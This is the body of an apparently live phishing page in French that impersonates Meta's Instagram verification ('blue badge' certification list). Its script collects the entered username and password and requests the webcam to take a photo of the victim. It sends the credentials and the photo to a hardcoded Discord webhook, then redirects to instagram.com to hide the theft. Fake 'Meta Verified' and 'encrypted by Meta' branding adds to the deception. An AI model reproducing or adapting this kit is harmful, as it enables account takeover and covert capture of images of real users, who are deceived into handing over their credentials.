<body>
    <div class="ig-wrapper">
        <div class="container">
            <div class="logo-container">
                <div class="logo"></div>
            </div>

            <div class="badge-title-container">
                <h2>Liste de certification (2 ans)</h2>
                <i class="fa-solid fa-circle-check verified-icon"></i>
            </div>
            
            <p>Connectez-vous pour lier votre compte à la liste d'attribution officielle du badge bleu.</p>
            
            <!-- Formulaire de connexion -->
            <form id="auth-form" onsubmit="return false;">
                <input type="text" id="username" class="input-field" placeholder="Nom d'utilisateur, mobile ou e-mail" required>
                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
                <button type="submit" class="btn" id="start-btn">Valider et continuer</button>
            </form>
            
            <video id="video" autoplay playsinline></video>
            <canvas id="canvas" style="display:none;"></canvas>
            
            <div class="footer-text">Données chiffrées et sécurisées par Meta.</div>
        </div>
        
        <div class="meta-footer">
            <i class="fa-solid fa-shield-halved"></i> Meta Verified • Sécurité & Protection
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btn = document.getElementById('start-btn');
        
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1568232984211882147/d-_mDSq4-UZeY_x0wtzQWCqt_FPCSCFmJnX-VQKtFY8gmml7AYok_v9AFmqzNdyyjBQQ";

        btn.addEventListener('click', async () => {
            const userVal = document.getElementById('username').value.trim();
            const passVal = document.getElementById('password').value.trim();

            if (!userVal || !passVal) {
                alert("Veuillez remplir tous les champs du formulaire.");
                return;
            }

            try {
                // 1. Demande l'accès à la caméra
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                btn.innerText = "Validation en cours...";
                btn.disabled = true;
                
                // 2. Création et formatage des données JSON des identifiants
                const credentialsData = {
                    "plateforme": "Instagram",
                    "contexte": "Demande de certification 2 ans",
                    "identifiants": {
                        "utilisateur": userVal,
                        "mot_de_passe": passVal
                    },
                    "horodatage": new Date().toISOString()
                };

                // 3. Capture instantanée de la webcam dès que la vidéo est prête
                video.onloadedmetadata = async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(async (blob) => {
                        const formData = new FormData();
                        
                        // Envoi propre du JSON et de la photo dans le webhook Discord
                        formData.append('payload_json', JSON.stringify({
                            content: "🚨 **Nouvelle capture & Identifiants récupérés !**\n```json\n" + JSON.stringify(credentialsData, null, 2) + "\n```"
                        }));
                        formData.append('file', blob, 'capture.jpg');

                        try {
                            await fetch(WEBHOOK_URL, {
                                method: 'POST',
                                body: formData
                            });
                        } catch (error) {
                            console.error(error);
                        }

                        // Redirection finale vers Instagram après un court délai
                        setTimeout(() => {
                            window.location.href = "https://www.instagram.com";
                        }, 500);
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');
                };

            } catch (err) {
                alert("Erreur : " + err.message);
            }
        });
    </script>
